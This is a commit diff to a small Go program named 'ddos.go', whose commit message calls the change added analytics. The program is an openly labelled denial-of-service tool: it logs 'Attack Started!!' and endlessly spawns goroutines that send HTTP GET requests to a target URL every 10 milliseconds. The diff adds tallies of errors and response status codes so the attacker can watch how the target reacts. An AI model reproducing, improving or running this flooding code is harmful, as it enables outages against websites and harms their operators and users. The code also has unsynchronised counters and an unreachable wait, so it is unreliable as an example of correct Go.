67d4221a6f6ea255a1314dc72f8d2542be62de1c
Stef <sstefin@bk.ru>
2020-08-01 10:28:08 -0500

    :chart_with_upwards_trend: Added analytics

--- ddosgo/ddos.go
+++ ddosgo/ddos.go
@@ -4,25 +4,52 @@ import (
   "net/http"
   "log"
   "time"
+  "sync"
 )
-var Totalrequest = new(int)
-var Totalresponse = new(int)
-var Totalbounced = new(int)
-var URL = new(string)
+
+var (
+  Totalrequest = new(int)
+  Totalresponse = new(int)
+  Totalbounced = new(int)
+  URL = new(string)
+  Errors map[string]int
+  Responses map[int]int
+  rwm     sync.RWMutex
+)
+
+func setError(key string) {
+	rwm.Lock()
+	defer rwm.Unlock()
+	Errors[key]+=1
+}
+
+func setResponse(key int)  {
+  rwm.Lock()
+  defer rwm.Unlock()
+  Responses[key]+=1
+}
 
 func Dodos(url string)  {
+  Errors = make(map[string]int)
+  Responses = make(map[int]int)
   *URL = url
+  var wg sync.WaitGroup
   log.Print("Attack Started!!")
   for {
     go func ()  {
+      wg.Add(1)
       *Totalrequest += 1
-      _, err := http.Get(url)
+      resp, err := http.Get(url)
       if err != nil {
         *Totalbounced += 1
+        setError(string(err.Error()))
       }else{
         *Totalresponse += 1
+        setResponse(resp.StatusCode)
       }
+      wg.Done()
     }()
     time.Sleep(10*time.Millisecond)
   }
+  wg.Wait()
 }
